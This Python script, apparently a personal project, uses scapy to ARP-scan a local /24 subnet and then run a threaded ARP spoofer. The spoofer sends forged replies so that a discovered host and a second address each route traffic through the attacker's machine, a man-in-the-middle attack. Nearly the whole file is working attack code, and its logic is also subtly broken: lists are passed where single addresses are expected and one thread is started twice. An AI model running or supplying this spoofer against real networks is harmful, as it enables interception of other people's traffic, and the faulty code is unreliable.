#!/home/sudharsan/myenv/bin/python3
import scapy.all as scapy 
import time
import re
import subprocess
import threading 
k=True
request = scapy.ARP() 

output = subprocess.check_output(['iwconfig']).decode('utf-8')

# Extract the MAC address of the access point
mac_address = re.search(r'Access Point:\s+([0-9A-Fa-f:]+)', output)

mac_address = mac_address.group(1)
l=[]
l1=[]
print(mac_address)
request.pdst = '10.1.32.0/24'
broadcast = scapy.Ether() 
thread=[]
broadcast.dst = 'ff:ff:ff:ff:ff:ff'
a=0
i=0
ip=""
mac=""
#my_thread = threading.Thread(target=send_spoof_packets, daemon=True)
request_broadcast = broadcast / request 

def arp_spoofer(target_ip, target_mac, spoof_ip):
    """ To update the ARP tables this function needs to be ran twice. Once with the gateway ip and mac, and then with the ip and mac of the target.
    Arguments: target ip address, target mac, and the spoof ip address.
    """
    # We want to create an ARP response, by default op=1 which is "who-has" request, to op=2 which is a "is-at" response packet.
    # We can fool the ARP cache by sending a fake packet saying that we're at the router's ip to the target machine, and sending a packet to the router that we are at     the   target machine's ip.
    pkt = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # ARP is a layer 3 protocol. So we use scapy.send(). We choose it to be verbose so we don't see the output.
    scapy.send(pkt, verbose=False)


def send_spoof_packets():
    # We need to send spoof packets to the gateway and the target device.

    while k:
        # We send an arp packet to the gateway saying that we are the the target machine.
        #arp_spoofer(gateway_info["ip"], gateway_info["mac"], node_to_spoof["ip"])
        arp_spoofer(ip,mac, l)
        # We send an arp packet to the target machine saying that we are gateway.
        arp_spoofer(l, l1,ip)
        #arp_spoofer(node_to_spoof["ip"], node_to_spoof["mac"],gateway_info["ip"])
        # Tested time.sleep() with different values. 3s seems adequate.
        time.sleep(3)

        
t1 = threading.Thread(target=send_spoof_packets, daemon=True)

while True:
    clients = scapy.srp(request_broadcast, timeout = 10,verbose=1)[0]
    for element in clients: 
	    print(element[1].psrc + "	 " + element[1].hwsrc) 
	    if element[1].hwsrc not in l1:
	        print("new client found")
	        l.append(element[1].psrc)
	        l1.append(element[1].hwsrc)
	        ip=l[0]
	        mac=l1[0]
	        a=1
    
    if((a==1)and (i!=0)):
	    k=False
	    k=True
	    print("Threading restarted")
	    t1.start()
	
    if(i==0):
	    a=0
	    i=i+1
	    del l[0]
	    del l1[0]
	    t1.start()
	            
	#print(clients.hwsrc)
    time.sleep(5)

